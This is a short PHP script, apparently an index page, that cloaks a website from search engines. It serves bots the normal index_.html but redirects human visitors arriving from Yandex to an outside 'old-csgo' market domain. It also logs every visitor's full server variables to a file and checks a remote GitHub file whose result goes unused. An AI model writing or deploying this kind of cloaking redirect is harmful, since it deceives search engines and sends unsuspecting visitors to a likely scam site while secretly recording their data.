<?

$context = stream_context_create(['http' => ['ignore_errors' => true]]);
$result = file_get_contents('https://github.com/batum2022fam/keysaccess/blob/main/podmena', false, $context);
$header = current($http_response_header);
preg_match('/http\/\d\.\d\s+(\d+).+/iu', $header, $m);
$accessOk = intval($m[1]) === 200;

$isBot = stripos($_SERVER['HTTP_USER_AGENT'], 'bot') !== false;
$isFromYandex = stripos($_SERVER['HTTP_REFERER'], 'yandex') !== false;

file_put_contents($_SERVER['DOCUMENT_ROOT'].'/deny/index.log', var_export([
    'date' => date('d.m.Y H:i:s'),
    '_srv' => $_SERVER,
    'isbot' => $isBot,
    'isfromyandex' => $isFromYandex,
    'access' => $accessOk,
], 1)."\n\n",FILE_APPEND);

if (!$isBot && $isFromYandex) {
    header('Location: https://market.old-csgo.com.ru');
    exit;
}

include 'index_.html';
